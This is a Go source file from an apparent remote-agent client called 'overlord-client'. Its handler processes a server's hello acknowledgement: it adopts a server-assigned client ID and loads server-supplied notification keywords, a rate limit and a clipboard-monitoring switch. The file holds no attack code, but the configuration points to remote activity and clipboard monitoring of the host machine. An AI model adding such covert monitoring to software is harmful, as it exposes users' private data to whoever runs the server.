package handlers

import (
	"context"
	"log"
	"strings"

	"overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"
)

func HandleHelloAck(_ context.Context, env *runtime.Env, envelope map[string]interface{}) error {
	log.Printf("hello ack received")
	if env == nil || envelope == nil {
		return nil
	}
	if canonicalID, ok := envelope["id"].(string); ok && env.SetServerClientID(canonicalID) {
		if env.Plugins != nil {
			env.Plugins.SetClientID(env.ClientID())
		}
		log.Printf("hello ack: using canonical client id %s", env.ClientID())
	}
	if version := toInt(envelope["protocolVersion"]); version > 0 {
		log.Printf("hello ack: negotiated wire protocol v%d (agent v%d)", version, wire.WireProtocolVersion)
	}

	var keywords []string
	minInterval := 0
	clipboardEnabled := false

	if raw, ok := envelope["notification"].(map[string]interface{}); ok {
		if rawKeywords, ok := raw["keywords"].([]interface{}); ok {
			for _, v := range rawKeywords {
				if s, ok := v.(string); ok {
					s = strings.TrimSpace(s)
					if s != "" {
						keywords = append(keywords, s)
					}
				}
			}
		}
		if v, ok := raw["minIntervalMs"].(float64); ok {
			minInterval = int(v)
		}
		if v, ok := raw["minIntervalMs"].(int); ok {
			minInterval = v
		}
		if v, ok := raw["clipboardEnabled"].(bool); ok {
			clipboardEnabled = v
		}
	}

	if len(keywords) > 0 || minInterval > 0 {
		env.SetNotificationConfig(keywords, minInterval, clipboardEnabled)
		log.Printf("hello ack: loaded %d notification keywords clipboard=%v", len(keywords), clipboardEnabled)
	}
	return nil
}
